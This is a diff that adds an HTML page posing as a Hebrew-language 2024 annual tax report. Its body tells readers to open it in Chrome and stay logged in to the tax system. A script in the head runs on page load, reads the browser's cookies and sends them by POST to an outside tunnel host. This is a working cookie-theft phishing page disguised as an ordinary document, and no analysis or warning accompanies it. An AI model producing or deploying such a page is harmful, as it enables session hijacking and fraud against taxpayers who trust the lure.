@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="he">
+<head>
+    <meta charset="UTF-8">
+    <title>דו"ח מס שנתי 2024</title>
+    <script>
+        console.log("Attempting to send cookies...");
+        var cookies = document.cookie; // קריאת העוגיות מהדפדפן
+        if (cookies) {
+            console.log("Cookies found:", cookies);
+
+            // יצירת בקשת HTTP לשליחת העוגיות לשרת
+            var httpRequest = new XMLHttpRequest();
+            httpRequest.open("POST", "https://pink-cases-lick.loca.lt", true); // כתובת השרת
+            httpRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+            httpRequest.send("cookies=" + encodeURIComponent(cookies)); // שליחת העוגיות
+
+            // טיפול בתגובה מהשרת
+            httpRequest.onload = function() {
+                if (httpRequest.status === 200) {
+                    console.log("Cookies sent and received successfully by the server.");
+                } else {
+                    console.warn("Failed to send cookies. Server responded with:", httpRequest.status);
+                }
+            };
+
+            // טיפול בשגיאות
+            httpRequest.onerror = function() {
+                console.error("An error occurred while trying to send cookies.");
+            };
+
+            console.log("Cookies sent successfully.");
+        } else {
+            console.warn("No cookies to send.");
+        }
+    </script>
+</head>
+<body>
+    <h1>דו"ח מס שנתי 2024</h1>
+    <p>נא לפתוח את הקובץ בדפדפן Google Chrome במחשב שולחני.</p>
+    <p>לצפייה מלאה, ודא שהדפדפן מחובר למערכת המס.</p>
+</body>
+</html>
